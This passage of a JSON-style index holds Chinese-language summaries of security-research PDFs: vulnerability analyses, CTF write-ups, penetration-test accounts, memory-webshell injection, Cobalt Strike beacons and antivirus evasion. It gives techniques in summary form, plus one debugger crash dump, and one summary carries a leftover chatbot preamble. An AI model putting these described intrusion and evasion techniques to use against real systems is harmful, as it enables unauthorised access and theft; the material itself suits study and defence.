        "page_content": "该文档分析了 VMware vRealize Network Insight 中的预身份验证 RCE 漏洞，该漏洞允许攻击者在无需身份验证的情况下执行远程代码。攻击者可以通过绕过 nginx 重写规则和查找格式化漏洞参数来利用此漏洞。该漏洞影响 VMware vRealize Network Insight 6.8.0.1666364233 版本，攻击者可以通过向易受攻击的系统发送精心设计的 Thrift 请求来利用此漏洞。",
        "FileName": "12758-Vmware VRealize NetWork Insight 系统中的预身份验证RCE.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 PHP 反序列化漏洞，通过触发魔法函数和变量赋值，最终获取 flag。具体步骤包括：将 Start 类的 name 赋值为 Info 对象，将 Info 类的 file 赋值为包含 Room 对象的数组，将 Room 类的 a 赋值为自身，然后序列化 Start 对象。通过反序列化该对象，可以触发 Room 类的 __invoke 魔法函数，从而读取 flag 文件并输出 base64 编码的 flag。",
        "FileName": "10831-2021强网杯 Web 赌徒 WP.pdf"
    },
    {
        "page_content": "本文档分析了 Apache Solr 启动过程中的关键类，包括 CoreContainer、SolrResourceLoader、SolrXmlConfig、CoresLocator、CorePropertiesLocator 和 SolrCores。CoreContainer 作为核心容器，负责加载和管理 Solr 核⼼，而其他类则负责加载配置、定位核⼼和初始化身份验证插件等任务。SolrCores 则负责存储和管理 Solr 核⼼。",
        "FileName": "9248-Apache Solr 启动过程中涉及一些关键类.pdf"
    },
    {
        "page_content": "该文档汇总了常见的未授权访问漏洞，包括 Docker、Redis、MongoDB、Memcached、Jboss、VNC、Docker、FTP、LDAP、ZooKeeper、Kibana、CouchDB、Apache Spark、Weblogic、HadoopYARN、Jenkins、Kubernetes、ActiveMQ、Jupyter Notebook、Elasticsearch、Zabbix、RabbitMQ、NFS、Dubbo、Druid、Solr、SpringBoot Actuator、SwaggerUI、Harbor、宝塔 phpmyadmin、WordPress 和 Atlassian Crowd。",
        "FileName": "12582-常见未授权漏洞访问汇总.pdf"
    },
    {
        "page_content": "文档主题是分析栈溢出，内容包括栈溢出原理、栈溢出利用方法、栈溢出保护技术以及栈溢出利用实例。",
        "FileName": "12645-栈溢出详解.pdf"
    },
    {
        "page_content": "ThinkPHP V6.0.12LTS 反序列化漏洞的成因在于 `wakeup()` 和 `destruct()` 两个魔术方法在反序列化中的重要性。通过对代码的分析，可以发现利用链为 `__wakeup()` -> `__destruct()`。其中，`__wakeup()` 函数在反序列化时会被调用，而 `__destruct()` 函数则在对象被销毁时调用。通过对代码的进一步审计，可以找到可以利用的点，例如 `safeStorage` 部分和 `AbstractCache` 类的 `__destruct()` 方法。通过对这些部分的分析，可以发现可以通过控制 `this->lazySave`、`this->withEvent`、`this->exists`、`this->force` 等参数来触发漏洞。",
        "FileName": "11584-关于ThinkPHP V6.0.12LTS 反序列化漏洞的二三事.pdf"
    },
    {
        "page_content": "该文档描述了 Nacos 中的一个未授权访问漏洞，该漏洞允许攻击者绕过身份验证并访问敏感配置，例如数据库密码和 Redis 凭据。该漏洞是由不当处理 User-Agent 标头引起的，可以通过在请求中使用特殊构造的 URL 来利用，从而导致 path 变量中出现额外的斜杠，从而绕过身份验证机制。",
        "FileName": "9119-某cos未授权访问漏洞和影响案例.pdf"
    },
    {
        "page_content": "本文探讨了基于 eBPF XDP 的 rootkit 的优点和检测方法。与基于 BPF 的 rootkit 相比，XDP rootkit 更加隐蔽，因为它们在数据包到达 BPF rootkit 之前就处理数据包。本文还提供了 XDP 后门的演示，并讨论了检测 XDP 后门的特征，例如系统调用和网络流量。",
        "FileName": "11639-聊一聊基于ebpf xdp的rootkit.pdf"
    },
    {
        "page_content": "本文档介绍了 Windows RPC 协议，从 PetitPotam 的 EFS 协议导致的强制认证漏洞入手，过渡到使用 EFS 协议进行本地提权，再自行挖掘一个强制认证和提权的未公开协议。其中包括了使用 MSVC、Python 对 RPC 协议编程的流程和坑点。以及在面对未知 RPC 时，如何对 RPCView 进行编译，并如何使用 RPCView 对未知 RPC 服务进行逆向并完成协议的编程和利用。",
        "FileName": "11879-WindowsRPC协议-从入门到提权0day.pdf"
    },
    {
        "page_content": "该文档分析了 OpenWrt 中 uhttpd 服务器的 CVE-2019-19945 漏洞，该漏洞可能导致堆缓冲区越界访问，从而导致崩溃。漏洞存在于 client.c 文件中，当处理用户提交的 HTTP 请求时，content-length 字段的转换存在问题，可能导致负值，从而导致后续处理中的崩溃。该漏洞影响 OpenWrt 18.06.4 及更早版本，在 18.06.5 版本中已修复。",
        "FileName": "9041-uhttpd CVE-2019-19945漏洞分析.pdf"
    },
    {
        "page_content": "D-Link DIR-645 路由器存在一个缓冲区溢出漏洞，该漏洞允许攻击者通过 POST 请求发送精心构造的数据来执行任意代码。该漏洞位于 authentication.cgi 脚本中，该脚本负责处理用户登录请求。攻击者可以通过向脚本发送包含过长密码的 POST 请求来触发溢出，从而覆盖栈上的返回地址并执行任意代码。",
        "FileName": "10059-D-Link DIR-645路由器溢出分析.pdf"
    },
    {
        "page_content": "该文档详细介绍了 bWAPP 应用程序中与身份验证和会话管理相关的各种安全漏洞，包括验证码绕过、忘记密码功能、不安全的登录表单、会话管理、Cookie 和会话 ID 暴露在 URL 中等。它提供了利用这些漏洞的方法，并强调了及时销毁验证码有效性、添加时间限制、使用安全哈希函数、设置 Cookie 的 HttpOnly 标志以及避免在 URL 中暴露会话 ID 的重要性。",
        "FileName": "12072-5.bWAPP Broken Auth. & Session Mgmt.pdf"
    },
    {
        "page_content": "该文档记录了一次对某网站进行基础渗透测试的过程，通过目录扫描、文件下载、数据库配置获取、文件包含漏洞利用等技术，最终成功获取了网站的shell权限。",
        "FileName": "8598-对某网站对一次基础渗透.pdf"
    },
    {
        "page_content": "该文档分析了 ZZCMS 代码审计的思维导图，重点关注了通过 SQL 注入漏洞利用可控参数来查询数据库并显示结果的过程。审计过程涉及绕过 WAF、分析代码执行流程和构造有效 payload，最终验证了漏洞的存在。",
        "FileName": "10658-ZZCMS201910代码审计.pdf"
    },
    {
        "page_content": "本文档探讨了 WinPwn 工具的使用，包括利用 pwntools 编写 EXP 和调试程序，以及 ret2dll 攻击技术。通过分析示例代码和调试过程，本文档展示了如何利用 WinPwn 进行 Windows 程序的漏洞利用。",
        "FileName": "11891-win-pwn初探（二）.pdf"
    },
    {
        "page_content": "该文档提供了 xhCMS 代码审计的思路，包括重装漏洞、SQL 注入漏洞、文件包含漏洞、XSS 漏洞、越权漏洞和 CSRF 漏洞的分析和利用方法。通过对 xhCMS 代码的审计，可以发现并利用这些漏洞，从而获得对系统的控制权。",
        "FileName": "10429-xhCMS代码审计思路.pdf"
    },
    {
        "page_content": "该文档记录了一次网络安全实战，通过信息搜集、漏洞利用和流量转发，攻击者成功突破目标服务器的防御，获取了内网访问权限，并探讨了在 OpenStack+CloudInit 环境中逃逸的可能性。",
        "FileName": "9869-记一次授权实战.pdf"
    },
    {
        "page_content": "该文档讲述了作者在渗透测试中发现了一个上传点，但由于后缀名限制无法直接上传一句话木马。作者通过溢出 Content-Disposition 字段成功上传木马，但由于没有返回完整路径，作者通过扫描一级目录找到了上传目录，最终成功 getshell。",
        "FileName": "10366-记一次略微曲折的上传.pdf"
    },
    {
        "page_content": "该文档分析了冰蝎各版本的流量特征和魔改思路。冰蝎是一款渗透测试工具，其不同版本在流量特征上存在差异。V2版本使用动态密钥协商机制，而V3版本采用预共享密钥。V4版本允许自定义加密解密协议，而某盟UTS则提供了多种魔改思路来绕过安全设备检测，包括修改加密算法、去除base64编码特征、修改请求协议等。",
        "FileName": "11989-冰蝎各版本工具分析与魔改思路.pdf"
    },
    {
        "page_content": "该文档介绍了使用 CodeQL 分析 Grafana 中任意文件读取漏洞的过程。作者从 LGTM 下载数据库，编译库，并分析数据流，最终通过定义 source、sink 和 isAdditionalTaintStep 成功跟踪污点，发现了漏洞。",
        "FileName": "10648-codeql分析grafana任意文件读取.pdf"
    },
    {
        "page_content": "该文档详细介绍了对 zzcms 代码的审计过程，发现了多个漏洞，包括重装漏洞、反射 XSS 漏洞、SQL 注入漏洞和存储 XSS 漏洞。审计过程涉及了代码分析、手动审计和利用 seay 代码审计工具的自动审计功能。",
        "FileName": "10090-代码审计之zzcms.pdf"
    },
    {
        "page_content": "该文档详细描述了作者利用阿里云 AKSK 访问目标网络，并通过劫持谷歌验证码绕过后台登录限制的过程。作者通过一系列技术手段，包括内存转储、信息收集、后门插件开发和会话维持，最终获得了管理员权限并成功获取了目标系统的控制权。",
        "FileName": "8429-AKSK 命令执行到谷歌验证码劫持.pdf"
    },
    {
        "page_content": "该文档详细介绍了利用某 CMS 系统中的命令执行漏洞的过程，包括爆出网站根路径、生成 phar 文件、修改文件后缀为 gif、访问特定 URL 写入 webshell 等步骤，最终在网站目录下生成 webshell 并提供访问密码。",
        "FileName": "10488-某cms代码审计.pdf"
    },
    {
        "page_content": "这篇文档分析了谷歌在 kCTF 漏洞奖励计划中对 Linux 内核堆安全加固的思路，重点关注针对 UAF 漏洞利用的两种加固措施：隔离固定大小和非固定大小内存分配，以及防止跨缓存攻击。文档还讨论了绕过这些加固措施的潜在方法，例如利用非固定大小结构体或寻找类似大小的结构体进行类型混淆。",
        "FileName": "12898-从kCTF看Linux内核堆安全加固思路.pdf"
    },
    {
        "page_content": "该文档主要介绍了在一次代码审计中发现的五个漏洞，包括上传功能漏洞、不安全的直接对象引用、越权漏洞、权限绕过漏洞和 SQL 注入漏洞。文档详细分析了每个漏洞的成因、影响和绕过方法，并提供了相应的修复建议。",
        "FileName": "12681-记一次代码审计中发现的几个漏洞.pdf"
    },
    {
        "page_content": "该文档分析了 xxx 安全网关前端 JavaScript 代码，该代码用于通过 cookie 收集客户端数据并判断用户是否异常。代码通过 get_tool_feature()、get_browser_feature() 和 get_fingerprint() 函数收集工具特征、浏览器特征和浏览器指纹，并使用 get_submit() 和 get_token() 函数加密表单数据和 URL。该代码还设置了事件监听器，在页面加载、点击、表单提交和 AJAX 请求时触发，以处理数据并添加令牌。",
        "FileName": "10802-某安全网关前端JS分析.pdf"
    },
    {
        "page_content": "该文档详细介绍了voucher_swap漏洞，并分步解释了如何在iOS 12上获取内核任务端点。该漏洞利用了MIG生成的代码中引用计数的问题，允许攻击者通过释放voucher的引用并覆盖已释放voucher的指针来获得指向已释放voucher的悬空指针。通过利用管道缓冲区和OOL端口描述符，攻击者可以喷射内存并占有已释放的voucher，从而获得指向管道缓冲区的指针。然后，他们可以修改引用计数以指向管道缓冲区，并找到与伪造端口重叠的管道缓冲区。通过读取管道缓冲区中的数据，攻击者可以找到伪造端口的地址，并使用它来计算内核任务端点的地址。最后，他们可以创建伪造的内核任务端点，并使用它来进行完整的内核读写。",
        "FileName": "8633-从0到tfp0第二部分：voucher_swap EXP详解.pdf"
    },
    {
        "page_content": "该文档讨论了在 Flask 应用程序中利用内存马和报错来实现命令回显，即使目标机器不出网。它介绍了如何通过构造一个 base64 编码的异常来触发报错，并通过 sys.modules 访问正在运行的应用程序，从而添加一个后门路由。",
        "FileName": "10456-flask不出网回显方式.pdf"
    },
    {
        "page_content": "**主题：** RSAC 创新沙盒入围企业 Endor Labs 的依赖生命周期管理解决方案\n\n**内容：** Endor Labs 是一家专注于供应链安全管理的公司，其依赖生命周期管理解决方案通过在依赖关系层面建立全面的了解，帮助企业降低开源漏洞的风险。该解决方案包括在依赖引入前评估风险、可视化 SBOM 清单、可达性分析、删除建议和 ChatGPT 集成，以提供更优的开源组件引入建议。",
        "FileName": "12463-RSAC创新沙盒十强出炉，这家SCA公司火了.pdf"
    },
    {
        "page_content": "该文档介绍了如何通过远程线程注入代码来实现代码注入，与 DLL 注入不同，代码注入的体积更小、更隐蔽，通过创建远程线程将代码注入目标进程的内存中，从而实现代码执行。",
        "FileName": "11933-进程注入：通过远程线程注入代码.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2022-1162 GitLab 硬编码漏洞，该漏洞允许攻击者通过 OmniAuth 提供商注册的帐户控制帐户。该漏洞存在于 GitLab CE/EE 版本 14.7(14.7.7 之前 ) 、 14.8(14.8.5 之前 ) 和 14.9(14.9.2 之前 ) 中，攻击者可以通过利用 GitHub OAuth 应用的回调 URL 不匹配来获取访问令牌，从而控制帐户。",
        "FileName": "11236-CVE-2022-1162 gitlab 硬编码漏洞分析.pdf"
    },
    {
        "page_content": "本文探讨了 WebService 的概念、技术实现和应用场景，重点介绍了基于 SOAP 协议的 WebService 接口攻击技术。作者分享了手动测试和工具辅助半自动化测试的思路，并提供了具体的测试流程和技巧。",
        "FileName": "7541-浅析接口安全之WebService.pdf"
    },
    {
        "page_content": "本文分析了作者在 2019 年发现的 NodeJS 问题，包括 MongoDB ObjectId 函数、NodeJS 序列化过程、nodemailer 库、class-validator 库、request 库、pomelo 框架和 json-sql 中间件中的漏洞。这些漏洞主要源于不合理使用 Node 模块、缺乏输入类型检查以及第三方验证器的缺陷，可能导致拒绝服务攻击或逻辑漏洞。",
        "FileName": "7237-本人在2019年对一些NodeJS问题的研究.pdf"
    },
    {
        "page_content": "本文探讨了利用返回导向编程 (ROP) 绕过具有不可执行堆栈 (NX) 保护的 64 位二进制文件。作者通过分析二进制代码，确定了可以利用的函数和系统调用，并使用 ROP 小工具构建了一个漏洞利用脚本，成功地改变了程序的执行流程并获得了 flag。",
        "FileName": "12359-绘画二进制0x000002攻击的艺术【ROP巫术使用】.pdf"
    },
    {
        "page_content": "该文档分析了 NodeJS EJS 模板引擎中存在的 SSTI（服务器端模板注入）漏洞，该漏洞允许攻击者通过浅拷贝覆盖设置值，最终插入 OS 命令导致 RCE。文档提供了漏洞复现步骤、代码分析和利用方法，并给出了常用于 EJS 模板引擎 RCE 的 POC。",
        "FileName": "12323-Ejs模板引擎注入实现RCE.pdf"
    },
    {
        "page_content": "该文档分析了 ThinkPHP3.2.*框架中的 POP 链，该链利用了 Imagick、Memcache、Model 和 Db 驱动类中的漏洞，允许攻击者通过反序列化执行任意代码。攻击者可以通过控制成员变量来调用其他类的 destroy 方法，从而删除记录并执行任意 SQL 语句，包括读取文件和执行 SQL 注入。",
        "FileName": "11012-ThinkPHP3.2.POP链复现(SQL注入&读取文件).pdf"
    },
    {
        "page_content": "本文探讨了利用 Shiro 反序列化漏洞和 Tomcat 内存马注入的原理和方法。作者通过创建自定义类 Init，实现了 ServletRequestListener 接口，并将其添加到 StandardContext 中，从而在每个请求中执行任意命令。为了解决请求头过大的问题，作者将恶意代码放在 POST 请求的正文中，并使用自定义类加载和执行代码。此外，作者还提供了针对 Tomcat 7 的利用链，并优化了代码以满足 8kb 的限制。",
        "FileName": "9755-Shiro反序列化与Tomcat内存马注入学习.pdf"
    },
    {
        "page_content": "该文档主要介绍了AFL-Unicorn的主题和内容，包括Unicorn-engine-tutorial、afl-unicorn part1、afl-unicorn part2等内容。",
        "FileName": "7545-sakuraのall fuzz  afl-unicorn.pdf"
    },
    {
        "page_content": "该文档分析了 Apache Flink 中的两个漏洞 (CVE-2020-17519 和 CVE-2020-17518)，这些漏洞允许攻击者通过目录穿越访问未授权的文件。文档通过分析提交、源代码和 REST API 文档，确定了漏洞的根源，并提供了利用漏洞的步骤和修复方法。",
        "FileName": "8993-CVE-2020-17519 & CVE-2020-17518 分析.pdf"
    },
    {
        "page_content": "该文档分析了极致 cms v1.7 的一次审计，重点关注了插件部分，并发现了多个漏洞，包括存储型 XSS、SQL 注入、逻辑漏洞等。这些漏洞可能导致攻击者获取管理员权限、修改数据、绕过安全限制等。文档还提供了漏洞利用的演示和修复建议。",
        "FileName": "7872-极致cms v1.7的一次审计.pdf"
    },
    {
        "page_content": "本文档分析了 CTFShow 挑战中 PHP 无数字字母构造 webshell 的方法，包括异或、自增、不可见字符和特殊字符的利用。通过这些方法，可以构造出绕过过滤的 payload，实现命令执行。",
        "FileName": "11929-从CTFShow[RCE挑战]中学习无字母数字构造webshell.pdf"
    },
    {
        "page_content": "                    好的，我明白了。以下是文档的主题和内容，以两段话的形式呈现：\n\n                    **主题：** 分析 snakeyaml 漏洞在一般场景下注⼊内存⻢的难点，并对存在内嵌 tomcat 依赖的 spring 应⽤ 提出⼀种漏洞利⽤思路\n\n                    **内容：**\n                    - 介绍了 snakeyaml 漏洞在⼀般场景下注⼊内存⻢的难点，包括无法加载依赖、线程绑定的上下⽂报错等。\n                    - 提出了一种针对存在内嵌 tomcat 依赖的 spring 应⽤ 的漏洞利⽤思路，通过反射获取内嵌 tomcat 上下⽂，进⽽取出 requestMappingHandlerMapping 绑定的拦截器列表，再插⼊恶意拦截器以达到注⼊内存⻢的目的。",
        "FileName": "11208-springboot snakeyaml利用浅析.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2020-10189 漏洞，该漏洞影响 Zoho ManageEngine Desktop Central 10，允许攻击者通过反序列化远程代码执行来控制安装该产品的服务器，该服务器用于管理网络中的设备。文档详细介绍了漏洞的分析过程，包括寻找反序列化点、文件上传点和可用的序列化小工具，并提供了构建序列化文件和演示漏洞效果的步骤。",
        "FileName": "7404-CVE-2020-10189Zoho ManageEngine Desktop Central 10反序列化远程代码执行.pdf"
    },
    {
        "page_content": "RedGuard 是一款 C2 设施前置流量控制工具，旨在通过拦截恶意流量、限制地域上线、基于时间段拦截和使用 Malleable C2 配置文件等功能，为攻击团队提供更隐蔽的 C2 基础设施和更有效的流量交互。",
        "FileName": "11397-RedGuard - C2前置流量控制工具.pdf"
    },
    {
        "page_content": "本文探讨了云原生环境中入侵检测的演变，强调了资产多样化、服务碎片化、中间件激增和基础设施默认安全等趋势。它指出，入侵检测正在变得更加“业务化”，行为分析将成为其核心能力，因为API通信和UEBA技术在云原生场景中变得越来越重要。",
        "FileName": "7841-云原生入侵检测趋势观察.pdf"
    },
    {
        "page_content": "该文档分析了 Final1stspy APT37 恶意软件样本，重点关注其反调试技术、WMI 查询持久化、进程枚举反监控、进程替换技术和关联分析。它揭示了该恶意软件使用 base64 编码、sha1 哈希、com 组件和进程注入来逃避检测和执行恶意操作。通过代码复用和特殊字段匹配，该分析将该恶意软件归因于 Final1stspy 家族，并提供了与该家族相关的 IOC 和 ATT&CK ID。",
        "FileName": "7429-APT37分析之Final1stspy.pdf"
    },
    {
        "page_content": "本文主要介绍了IAST（交互式应用程序安全测试）的概念、原理和实现方式。IAST是一种通过插桩技术监控和收集程序运行过程中信息，根据这些信息来判断程序是否存在告警的应用程序安全测试技术。它对来自客户端产生的请求和响应进行分析，类似于DAST；同时它能够监控数据流信息，通过污点分析产生告警，又类似于SAST。IAST有主动插桩模式和被动插桩模式两种，本文重点介绍了被动插桩模式的实现原理和示例代码。",
        "FileName": "11042-IAST学习笔记.pdf"
    },
    {
        "page_content": "该文档介绍了一个通用的信息推送框架的开发，该框架通过解析 RSS 源收集安全信息，并使用插件式开发和协程技术将数据存储在 MongoDB 中。框架支持自定义插件和类别，并提供企业微信推送功能，方便用户根据需求快速查看信息。",
        "FileName": "7165-打造一个通用的信息推送框架.pdf"
    },
    {
        "page_content": "该文档记录了一次授权渗透测试的经历，其中涉及了通过头像上传漏洞获取网站后台访问权限、利用 VMware vSphere 6.5 漏洞获取内网 shell、通过弱口令攻击进入域控等技术手段。文档强调了人为疏漏在网络安全中的重要性，并建议通过加强安全措施来防止类似攻击。",
        "FileName": "9503-记一次授权渗透测试（2）.pdf"
    },
    {
        "page_content": "本文介绍了 Linux 下 Object 文件加载器的技术，并提供了实现代码。该加载器可以加载 Coff 文件，并通过分析 ELF 文件结构和重定位节，正确重定向函数调用和字符串引用。",
        "FileName": "12615-Linux下的Object文件加载器.pdf"
    },
    {
        "page_content": "该文档提供了有关在 Windows 本地系统上获取密码哈希的各种方法，包括使用 mimikatz、SharpDump、Procdump 和其他工具。它还讨论了绕过杀毒软件保护和从 SAM 数据库中提取哈希的方法。",
        "FileName": "7278-Windows本地hashdump备忘录.pdf"
    },
    {
        "page_content": "DataContractJsonSerializer 是 .NET 中用于对象与 JSON 之间转换的库，它通过标记 DataContract 和 DataMember 特性来控制序列化和反序列化过程。通过构造函数中的 type 参数和 DataContractJsonSerializerSettings 的设置，可以控制序列化过程，包括是否包含类型信息。此外，IDataContractSurrogate 接口允许自定义序列化过程，从而可以控制不在已知类型列表中的类型的序列化方式。",
        "FileName": "9601-.net反序列化之DataContractJsonSerializer.pdf"
    },
    {
        "page_content": "该文档分析了 Fastjson 中的一个正则表达式拒绝服务漏洞，该漏洞是由 JSONPath 中对正则表达式的可控使用引起的。当传入的正则表达式可控时，它会导致拒绝服务，因为正则表达式匹配过程会消耗大量资源。该漏洞影响 Fastjson 1.2.36 至 1.2.62 版本。",
        "FileName": "7483-fastjson 正则拒绝服务简单分析.pdf"
    },
    {
        "page_content": "该文档提供了三个网络安全实验室的 URL，每个 URL 都包含上传图像并修改其后缀名的说明。通过修改后缀名并放包，可以获得三个不同的密钥：IKHJL9786#$%^&、76tyuhjsdvytig#$%^& 和 76tyuh12OKKytig#$%^&。",
        "FileName": "12150-网络安全实验室5.上传关.pdf"
    },
    {
        "page_content": "该文档讨论了在 Azure Container Registries (ACR) 管理员凭据泄露的情况下如何利用该凭据。它提供了分步指南，说明如何访问 ACR、枚举容器名称和版本信息，以及启动 Docker 容器以查看敏感信息。该文档还强调了限制 ACR 对特定网络的访问以及谨慎使用管理员凭据的重要性。",
        "FileName": "7847-Azure Container Registries 凭据泄露场景下的利用思路.pdf"
    },
    {
        "page_content": "GenieACS 1.2.8 之前的版本存在认证前 RCE 漏洞，该漏洞源于 UI 界面 API 对 ping 主机参数未进行充分输入验证和授权检查，攻击者可利用该漏洞在未经身份验证的情况下执行任意命令。",
        "FileName": "11722-GenieACS CVE-2021-46704认证前RCE漏洞分析.pdf"
    },
    {
        "page_content": "该文档详细介绍了在严格的网络环境中，通过正向代理和正向 shell 技术，突破安全策略上线内网 CS 的过程。文中阐述了 Pystinger 反向代理失败的原因，并提出了使用 ABPTTS 搭建 HTTP 隧道和正向 shell 免杀的解决方案。此外，还介绍了 PrintSpoofer 提权和绕过杀毒添加用户的技巧，最终成功渗透目标主机并获得 system 权限。",
        "FileName": "10410-内网渗透--突破安全策略上线CS.pdf"
    },
    {
        "page_content": "**文档主题：** CVE-2020-0674 IE jscript.dll 释放后重用漏洞分析\n\n**文档内容：**\n该漏洞的成因是因为：若 Array.sort() 被调⽤时传⼊⼀个⽐较函数， jscript 内部没有将此⽐较函数的两个参数加⼊ GC ，导致可以在对象被 释放后得到悬垂指针。笔者所⽤分析环境如下： Windows 7 sp1 64 位  + IE 11(jscript.dll 5.8.9600.17840 64 位 ) 为 IE 开启⻚堆，在调试器中打开上述 PoC ，可以观察到如下崩溃：( 3 a8 . c60 ) : \t Access \t violation \t - \t code \t c0000005 \t ( first \t chance ) First \t chance \t exceptions \t are \t reported \t before \t any \t exception \t handling . This \t exception \t may \t be \t expected \t and \t handled . jscript ! CScriptRuntime :: TypeOf + 0x30 : 000007f e ` f06c1e28 \t 0f b717 \t\t\t\t\t\t\t\t\t\t movzx \t\t\t edx , word \t ptr\n[ rdi ] \t ds : 00000000 ` 047f 5 d30 =???? 0 : 012 > \t ub \t @ rip jscript ! CScriptRuntime :: TypeOf + 0x30 : 000007f e ` f06c1e28 \t 0f b717 \t\t\t\t\t\t\t\t\t\t movzx \t\t\t edx , word \t ptr \t [ rdi ] \t ; 显然，这⾥在取 VARIANT 的 Type 000007f e ` f06c1e2b \t 81f\na810000000 \t\t\t\t cmp \t\t\t\t\t edx , 81 h \t ; 判断 VARIANT 的 Type 是否为 Object 000007f e ` f06c1e31 \t 7e66 \t\t\t\t\t\t\t\t\t\t\t\t jle \t\t\t\t\t jscript ! CScriptRuntime :: TypeOf + 0xa1 \t ( 000007f e ` f06c1f08 ) 000007f e ` f06c1e33 \t 81f a830000000 \t\t cmp \t\t\t\t\t edx , 83 h 000007f e ` f06c1e39 \t 0f 85 c9000000 \t\t\t\t jne \t\t\t\t\t jscript ! CScriptRuntime :: TypeOf + 0x110 \t ( 000007f e ` f06c1f08 ) 000007f e ` f06c1e3f \t 488 b16 \t\t\t\t\t\t\t\t\t\t mov \t\t\t\t\t rdx , qword \t ptr \t [ rsi ] 000007f e ` f06c1e42 \t 4 c8d4de0 \t\t\t\t\t\t\t\t lea \t\t\t\t\t r9 ,[ rbp - 20 h ] 000007f e ` f06c1e46 \t 448 d7b7e \t\t\t\t\t\t\t\t lea \t\t\t\t\t r15d ,[ rbx + 7 Eh ] 0 : 012 > \t u \t @ rip jscript ! CScriptRuntime :: TypeOf + 0x30 : 000007f e ` f06c1e28 \t 0f b717 \t\t\t\t\t\t\t\t\t\t movzx \t\t\t edx , word \t ptr \t [ rdi ] \t ; 显然，这⾥在取 VARIANT 的 Type 000007f e ` f06c1e2b \t 81f\na810000000 \t\t\t\t cmp \t\t\t\t\t edx , 81 h \t ; 判断 VARIANT 的 Type 是否为 Object 000007f e ` f06c1e31 \t 7e66 \t\t\t\t\t\t\t\t\t\t\t\t jle \t\t\t\t\t jscript ! CScriptRuntime :: TypeOf + 0xa1 \t ( 000007f e ` f06c1f08 ) 000007f e ` f06c1e33 \t 81f a830000000 \t\t cmp \t\t\t\t\t edx , 83 h 000007f e ` f06c1e39 \t 0f 85 c9000000 \t\t\t\t jne \t\t\t\t\t jscript ! CScriptRuntime :: TypeOf + 0x110 \t ( 000007f e ` f06c1f08 ) 000007f e ` f06c1e3f \t 488 b16 \t\t\t\t\t\t\t\t\t\t mov \t\t\t\t\t rdx , qword \t ptr \t [ rsi ] 000007f e ` f06c1e42 \t 4 c8d4de0 \t\t\t\t\t\t\t\t lea \t\t\t\t\t r9 ,[ rbp - 20 h ] 000007f e ` f06c1e46 \t 448 d7b7e \t\t\t\t\t\t\t\t lea \t\t\t\t\t r15d ,[ rbx + 7 Eh ] 0 : 012 > \t k Child - SP \t\t\t\t\t\t\t\t\t\t RetAddr \t\t\t\t\t\t\t\t\t\t\t Call \t Site 00000000 ` 11 bba7c0 \t 000007f e ` f06c1ddb \t jscript ! CScriptRuntime :: TypeOf + 0x30 00000000 ` 11 bba830 \t 000007f e ` f0698ec2 \t jscript ! CScriptRuntime :: Run + 0x3c88 00000000 ` 11\nbbb630 \t 000007f e ` f0698d2b \t jscript ! ScrFncObj :: CallWithFrameOnStack + 0x162 00000000 ` 11 bbb840 \t 000007f e ` f0698b95 \t jscript ! ScrFncObj :: Call + 0xb7 00000000 ` 11 bbb8e0 \t 000007f e ` f069e640 \t jscript ! CSession :: Execute + 0x19e 00000000 ` 11 bbb9b0 \t 000007f e ` f06a70e7 \t jscript ! COleScript :: ExecutePendingScripts + 0x17a 00000000 ` 11 bbba80 \t 000007f e ` f06a68e6 \t jscript ! COleScript :: ParseScriptTextCore + 0x267 00000000 ` 11 bbbb70 \t 000007f e ` ec4a9d41 \t jscript ! COleScript :: ParseScriptText + 0x56 00000000 ` 11 bbbbd0 \t 000007f e ` ec4a97e2 \t MSHTML ! CActiveScriptHolder :: ParseScriptText + 0xc1 00000000 ` 11 bbbc50 \t 000007f e ` ec4aa8e5 \t MSHTML ! CScriptCollection :: ParseScriptText + 0x27a 00000000 ` 11 bbbd30 \t 000007f e ` ec4aa457 \t MSHTML ! CScriptData :: CommitCode + 0x395 00000000 ` 11 bbbf00",
        "FileName": "7759-IE jscript.dll释放后重用漏洞(CVE-2020-0674)分析.pdf"
    },
    {
        "page_content": "文档分析了对抗样本的主题和内容，包括对抗样本的定义、原理、生成方法和防御措施。对抗样本是一种精心设计的输入，可以欺骗机器学习模型，使其对输入做出错误的预测。对抗样本的原理是利用机器学习模型的线性性质，通过在输入中添加一些小的扰动，就可以改变模型的预测结果。生成对抗样本的方法有很多，其中最常见的是快速梯度符号法（FGSM）。防御对抗样本的措施包括正则化、对抗训练和输入验证。",
        "FileName": "11291-FGSM：从论文到实战.pdf"
    },
    {
        "page_content": "该文档分析了影响 79 款 Netgear 路由器的严重栈缓存溢出远程代码执行漏洞，该漏洞允许攻击者以 root 权限执行代码并接管设备。漏洞影响固件版本为 1.0.11.100_10.2.100 及之前的 Netgear R7000 路由器，研究人员提供了 PoC 代码和详细的复现步骤，包括串口调试和 httpd 程序调试，并强调了漏洞利用的关键点和补丁比较。",
        "FileName": "9320-复现影响79款Netgear路由器高危漏洞.pdf"
    },
    {
        "page_content": "该文档分析了 PHP 代码审计学习之函数缺陷中的 10 个 PHP 代码审计漏洞，包括 in_array 第三个参数未设置为 true、filter_var （url 过滤）未对协议进⾏校验、class_exists 当存在 __autoload 函数、strpos 在没找到指定字符时会返回 flase、filter_var (FILTER_VALIDATE_EMAIL) 问题、escapeshellarg 与 escapeshellcmd 配合使⽤会存在绕过、parse_str 的作⽤就是解析字符串并且注册成变量、preg_replace $pattern 存在 /e 模式修正符、extract 从数组中将变量导⼊到当前的符号表、readfile 可利⽤ ../http/../../ 跳过⽬录。",
        "FileName": "7765-php代码审计学习之函数缺陷.pdf"
    },
    {
        "page_content": "该文档详细描述了在内网靶场中利用各种漏洞和技术进行渗透测试的过程，包括端点扫描、目录扫描、Weblogic 漏洞利用、永恒之蓝攻击、域控接管和约束委派攻击。",
        "FileName": "10559-记一次内网靶场学习.pdf"
    },
    {
        "page_content": "本文档介绍了 Cobalt Strike 中 DNS Beacon 的工作原理和配置，包括设置 DNS 解析、配置 DNS 侦听器、测试解析和使用 checkin 命令与 Beacon 交互。它还讨论了不同的 DNS 模式，例如 dns 和 dns-txt，以及如何修改它们以提高传输速度。",
        "FileName": "7488-cobaltstrike dns beacon知多少.pdf"
    },
    {
        "page_content": "**主题：** 分析 Cobalt Strike 木马生成过程和开发免杀工具\n\n**内容：** 本文剖析了 Cobalt Strike 木马的生成机制，包括 ShellCode 生成、Artifact 修补和加载器开发。通过理解这些过程，研究人员可以开发免杀工具，绕过杀毒软件的检测，从而更好地理解木马的攻击行为。",
        "FileName": "8103-从剖析CS木马生成到开发免杀工具.pdf"
    },
    {
